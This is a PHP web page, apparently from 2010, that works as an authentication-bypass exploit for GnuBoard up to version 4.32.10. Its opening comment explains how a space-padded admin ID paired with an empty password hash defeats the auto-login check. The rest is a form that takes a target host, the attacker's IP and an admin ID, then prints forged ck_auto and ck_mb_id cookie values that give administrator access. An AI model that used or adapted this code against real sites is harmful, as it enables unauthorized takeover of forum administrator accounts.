<!--
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXX                                                               XXXXX
XXXXX            GnuBoard <= 4.32.10 Admin Login Exploit #2         XXXXX
XXXXX                                                               XXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

* Summary

- 402-421 lines in common.php
402     if ($tmp_mb_id = get_cookie("ck_mb_id"))
...
405         if ($tmp_mb_id != $config['cf_admin'])
...
407             $sql = " select mb_password, mb_intercept_date, mb_leave_date, mb_email_certify
408                        from {$g4['member_table']} where mb_id = '$tmp_mb_id' ";
...
410             $key = md5($_SERVER['SERVER_ADDR'] . $_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . $row['mb_password']);
...
412             $tmp_key = get_cookie("ck_auto");
413             if ($tmp_key == $key && $tmp_key)
414             {
...
421                     set_session("ss_mb_id", $tmp_mb_id);
...

- do exploit
SQL:
"select mb_password, mb_intercept_date, mb_leave_date, mb_email_certify  from {$g4['member_table']} where mb_id = ' admin '"
Cookie:
ck_mb_id=' admin ';
ck_auto='${key};

- created session file
ss_mb_id|s:7:" admin "; // included white-space (0x20)

- 627 line in lib/common.lib.php
 627     return sql_fetch(" select $fields from $g4[member_table] where mb_id = TRIM('$mb_id') "); // remove the white-space
//-->
<?
if(isset($_POST['target']))
  $target = $_POST['target'];
else
  $target = '';
if(isset($_POST['local_addr']))
  $local_addr = $_POST['local_addr'];
else
  $local_addr = $_SERVER['REMOTE_ADDR'];
if(isset($_POST['admin_id']))
  $admin_id = $_POST['admin_id'];
else
  $admin_id = 'admin';
?>

<HTML>
  <HEAD>
    <TITLE>Gnuboard &lt;= 4.32.10 Admin Login Exploit</TITLE>
  </HEAD>
  <BODY>
  <CENTER>
  <FONT FACE="Times Roman">
  <TABLE WIDTH=500 BGCOLOR=BLACK CELLPADDING=5 CELLSPACING=1>
    <TR>
      <TD BGCOLOR=WHITE>
      <TABLE WIDTH=500 BGCOLOR=BLACK CELLPADDING=0 CELLSPACING=0>
      <TR><TD BGCOLOR=WHITE>
      This exploit is creat the admin cookie.<BR>
      You can login to the site using created-cookie for administrator privilege :)<BR>
      <B><FONT COLOR=RED>DO NOT DISTRIBUTE! pLZ!</FONT></B><BR><BR>
      Reference: http://sir.co.kr/bbs/board.php?bo_table=g4_pds&wr_id=5270<BR><BR>
      </TD></TR>
      <TR><TD BGCOLOR=WHITE ALIGN=RIGHT>
      25. Oct, 2010 - 1ndr4 & fr33b34r
      </TD></TR></TABLE>
      </TD>
    </TR>
  </TABLE>
  <FORM METHOD=POST ACTION="<?=$_SERVER['PHP_SELF']?>" NAME="c00k">
  <TABLE WIDTH=500 BGCOLOR=WHITE CELLPADDING=5 CELLSPACING=1>
    <TR><TD BGCOLOR=WHITE ALIGN=RIGHT>
    Target Domain or IP Address: <INPUT TYPE=TEXT NAME="target" VALUE="<?=$target?>"><BR>
    Your IP Address: <INPUT TYPE=TEXT NAME="local_addr" VALUE="<?=$local_addr?>"><BR>
    Admin ID: <INPUT TYPE=TEXT NAME="admin_id" VALUE="<?=$admin_id?>"><BR>
    </TD></TR>
  </TABLE>
  <BR>
  <INPUT TYPE=SUBMIT VALUE="CrystalCastles 最高！">
  </FORM>
<?

if($target) {
  if(!$local_addr) {
    echo "<SCRIPT>alert('Illegal Option! It requires your IP Address information.'); history.go(-1); </SCRIPT>";
  } else if(!$admin_id) {
    echo "<SCRIPT>alert('Illegal Option! It requires Admin's ID information.'); history.go(-1); </SCRIPT>";
  }
  if(preg_match("/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/", trim($_POST['target']))) {
    $str_target = $target = $_POST['target'];
  } else {
    $target = gethostbyname($_POST['target']);
    if(strcmp($target, $_POST['target']) == 0) {
      echo "[!] gethostbyname() error: " . $_POST['target'];
      exit;
    } else {
      $str_target = $_POST['target'] . " ($target)";
    }
  }
  $user_agent = $_SERVER['HTTP_USER_AGENT'];
  $ck_auto_val = base64_encode(md5($target . $local_addr . $user_agent . ''));
  //$ck_mb_id_val = "IGFkbWluIA=="; // it's a static variable, string is ' admin '
  $ck_mb_id_val = base64_encode(' ' . $admin_id . ' ');
  $result = "a3e94372a6379bc1ae3698dfdf38595b";
  $result .= "=$ck_auto_val<BR>";
  $result .= "6e1280981e1dfd9169c5dea9c28ff2e3";
  $result .= "=$ck_mb_id_val";

  print "
  <TABLE WIDTH=800 BGCOLOR=BLACK CELLPADDING=5 CELLSPACING=1>
    <TR>
      <TD BGCOLOR=DARKGRAY>
      [*] TARGET: $str_target<BR>
      [*] YOUR IP ADDRESS: $local_addr<BR>
      [*] USER-AGENT: $user_agent<BR>
      [+] Making the value of `\$ck_auto' variable:<BR>
      [-]  ck_auto_var = md5(\$ck_auto) = \"a3e94372a6379bc1ae3698dfdf38595b\"<BR>
      [-]  ck_auto_val = base64_encode(md5(\$TARGET + \$YOUR_IP + \$USERAGENT + \$row['mb_password'] => ''));<BR>
      [-]  ck_auto_val = base64_encode(md5($target + $local_addr + $user_agent + ''));<BR>
      [+] Making the value of `\$ck_mb_id' variable:<BR>
      [-]  ck_mb_id_var = md5(\$ck_mb_id) = \"6e1280981e1dfd9169c5dea9c28ff2e3\"<BR>
      [-]  ck_mb_id_val = base64_encode(( ' $admin_id '));<BR>
      [*] Done.<BR><BR>
      <B><FONT COLOR=RED>Created Cookie:<BR>
      $result</FONT></B>
      </TD>
    </TR>
  </TABLE>";
}
?>
  </FONT>
  </BODY>
</HTML>
